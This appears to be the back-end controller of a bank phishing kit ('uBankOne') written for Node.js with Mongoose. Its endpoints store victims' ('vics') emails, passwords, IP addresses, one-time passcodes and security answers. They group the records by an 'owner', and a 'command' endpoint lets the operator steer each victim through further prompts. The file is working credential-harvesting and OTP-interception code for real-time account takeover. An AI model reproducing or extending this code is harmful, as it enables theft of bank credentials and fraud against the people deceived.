const uBankOne = require("../models/ubankOneModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  uBankOne.find({ owner }).exec((err, vics) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vics);
  });
};

const command = async (req, res) => {
  const { uniqueid, secQuestion, status } = req.body;
  try {
    if (status == 2) {
      await uBankOne
        .findOneAndUpdate({ uniqueid }, { secQuestion, status })
        .exec();
    } else {
      await uBankOne.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  uBankOne.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { email, password, uniqueid, owner, ip } = req.body;
  try {
    await uBankOne.create({ uniqueid, email, password, status: 1, owner, ip });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { email, password, uniqueid } = req.body;
  try {
    await uBankOne
      .findOneAndUpdate({ uniqueid }, { email, password, status: 9 })
      .exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await uBankOne.findOneAndUpdate({ uniqueid }, { otp, status: 5 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSecAnswer = async (req, res) => {
  const { secAnswer, uniqueid } = req.body;
  try {
    await uBankOne
      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 3 })
      .exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await uBankOne.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitSecAnswer,
  deleteEntry,
};
